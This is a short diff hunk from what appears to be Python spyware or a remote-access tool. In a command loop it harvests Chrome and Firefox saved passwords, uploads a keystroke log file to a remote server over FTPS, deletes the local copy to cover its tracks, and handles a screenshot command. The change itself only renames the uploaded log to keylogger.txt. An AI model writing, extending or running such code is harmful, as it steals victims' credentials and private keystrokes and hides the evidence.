@@ -497,9 +497,9 @@ def main():
                         get_chrome_passwords()
                         get_firefox_passwords()
                         time.sleep(2)
-                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/enc_dec.txt")
+                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
                         #locally delete the file after upload
-                        os.remove(str(get_path()) + "/keystrokes/enc_dec.txt")
+                        os.remove(str(get_path()) + "/keystrokes/keylogger.txt")
                     
                     elif command == "get screenshot":
                         if os.path.exists(str(get_path()) + "/screenshots/") :
